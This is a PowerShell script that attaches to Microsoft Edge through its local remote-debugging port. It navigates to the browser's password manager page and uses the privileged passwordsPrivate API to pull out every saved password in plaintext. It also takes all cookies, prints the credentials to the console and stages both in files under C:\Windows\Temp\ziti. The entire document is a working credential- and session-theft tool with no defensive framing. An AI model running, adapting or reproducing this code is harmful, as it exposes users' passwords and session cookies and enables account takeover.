$ErrorActionPreference = 'SilentlyContinue'

# Get target list, use first page target
$targets = (curl.exe -s http://127.0.0.1:9222/json/list | ConvertFrom-Json)
$page = $targets | Where-Object { $_.type -eq 'page' } | Select-Object -First 1
$wsUrl = $page.webSocketDebuggerUrl
Write-Output "[*] using target: $($page.url) -> $wsUrl"

# Connect
$ws = New-Object System.Net.WebSockets.ClientWebSocket
$ct = [System.Threading.CancellationToken]::None
$ws.ConnectAsync([Uri]$wsUrl, $ct).Wait()
Write-Output "[*] connected"

$buf = [byte[]]::new(10485760)

function Send-Cdp {
    param([int]$MsgId, [string]$Method, [hashtable]$Params)
    $m = @{ id = $MsgId; method = $Method }
    if ($Params) { $m['params'] = $Params }
    $json = ConvertTo-Json -Compress -InputObject $m -Depth 5
    $b = [System.Text.Encoding]::UTF8.GetBytes($json)
    $s = [ArraySegment[byte]]::new($b)
    $script:ws.SendAsync($s, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $ct).Wait()
    $s2 = [ArraySegment[byte]]::new($script:buf)
    $r = $ws.ReceiveAsync($s2, $ct).Result
    return [System.Text.Encoding]::UTF8.GetString($buf, 0, $r.Count)
}

# Navigate to password manager
Write-Output "[*] navigating to edge://password-manager/passwords..."
$navResp = Send-Cdp 1 "Page.navigate" @{ url = "edge://password-manager/passwords" }
Write-Output "[*] nav response: $($navResp.Substring(0, [Math]::Min(200, $navResp.Length)))"

# Wait for page to load
Start-Sleep 8

# Enable Runtime
$null = Send-Cdp 2 "Runtime.enable"

# Get saved password list using chrome.passwordsPrivate API
Write-Output "[*] getting password list..."
$js = 'new Promise(r => chrome.passwordsPrivate.getSavedPasswordList(l => r(JSON.stringify(l))))'
$listResp = Send-Cdp 3 "Runtime.evaluate" @{
    expression = $js
    awaitPromise = $true
    returnByValue = $true
}

$listData = ($listResp | ConvertFrom-Json)
$listValue = $listData.result.result.value
Write-Output "[*] list: $($listValue.Substring(0, [Math]::Min(200, $listValue.Length)))"

$passwords = $listValue | ConvertFrom-Json
Write-Output "[+] $($passwords.Count) passwords found"

# Extract each password
$results = @()
$msgId = 10
foreach ($entry in $passwords) {
    $pid_ = $entry.id
    $entryUrl = $entry.urls[0]
    $entryUser = $entry.username

    Write-Output "[*] getting password $pid_ for $entryUrl..."

    $jsGet = "new Promise(r => chrome.passwordsPrivate.getPlaintextPassword($pid_, pw => r(pw)))"
    $pwResp = Send-Cdp $msgId "Runtime.evaluate" @{
        expression = $jsGet
        awaitPromise = $true
        returnByValue = $true
    }
    $msgId++

    $pwData = ($pwResp | ConvertFrom-Json)
    $pw = $pwData.result.result.value

    $results += @{
        url = $entryUrl
        username = $entryUser
        password = $pw
    }
    Write-Output "  $entryUrl | $entryUser | $pw"
}

# Save
$out = $results | ConvertTo-Json -Depth 3
$out | Out-File "C:\Windows\Temp\ziti\all_passwords.json" -Encoding utf8

Write-Output ""
Write-Output "=== ALL PASSWORDS ==="
foreach ($r in $results) {
    Write-Output "$($r.url) | $($r.username) | $($r.password)"
}
Write-Output ""
Write-Output "[+] saved to C:\Windows\Temp\ziti\all_passwords.json"

# Also get all cookies via the page's CDP
$cookieResp = Send-Cdp 999 "Network.getCookies"
$cookieResp | Out-File "C:\Windows\Temp\ziti\cdp_cookies.json" -Encoding utf8
Write-Output "[+] cookies saved to C:\Windows\Temp\ziti\cdp_cookies.json"

$ws.Dispose()
Write-Output "[+] done"